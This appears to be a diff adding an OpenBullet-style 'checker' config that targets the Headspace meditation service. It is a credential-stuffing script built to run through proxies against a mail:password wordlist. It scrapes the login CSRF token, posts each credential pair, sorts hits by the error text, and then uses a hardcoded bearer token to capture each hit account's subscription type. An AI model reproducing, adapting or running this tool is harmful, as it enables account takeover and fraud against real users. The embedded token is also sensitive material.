@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Headspace",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-05T18:21:24.9440521+01:00",
+  "AdditionalInfo": "",
+  "Author": "DarkStarWarden",
+  "Version": "1.2.3.9 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUEST_GET REQUEST GET "https://www.headspace.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Csrf PARSE "<SOURCE>" CSS "[name=_csrf_token]" "value" -> VAR "csrf" 
+
+#Login REQUEST POST "https://www.headspace.com/login/check" 
+  CONTENT "do=login&_csrf_token=<csrf>&referrer=&_username=<USER>&_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.headspace.com" 
+  HEADER "referer: https://www.headspace.com/login" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Either your email or password was incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Either your email or password was incorrect" 
+
+#Profile REQUEST GET "https://api.prod.headspace.com/user/users?userId=HSUSER_XKTN0F73II9SNME3" 
+  
+  HEADER "authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY0NjZmOThiLTg1NDQtNDQzOS1hZjAzLTYyOGYzZGI4ZWRiMyIsInVzZXJJZCI6IkhTVVNFUl9YS1ROMEY3M0lJOVNOTUUzIiwicGxhdGZvcm0iOiJERVNLVE9QIiwic2NvcGUiOlsiVVNFUjpIU1VTRVJfWEtUTjBGNzNJSTlTTk1FMyJdLCJwcml2aWxlZ2VzIjpbIkZSRUVfVVNFUiIsIlNUQU5EQVJEX0NPTlRFTlQiXSwiaWF0IjoxNTU5NzQxMzE4OTk3LCJ2MkFwaUtleSI6IjAwcGMwbGc2WjhvSllHWm9IUG0yazV6SUNKUXFMMzdKZUNpNHlQb3d3d1k9In0.bi7Yows2XfZPEYEKmsh2YkVS5Km3S02nB71G1w7n0w4" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Subscription PARSE "<SOURCE>" LR "\":{\"type\":\"subscriptions\",\"id\":\"" "\"" -> CAP "Subscription" 
+
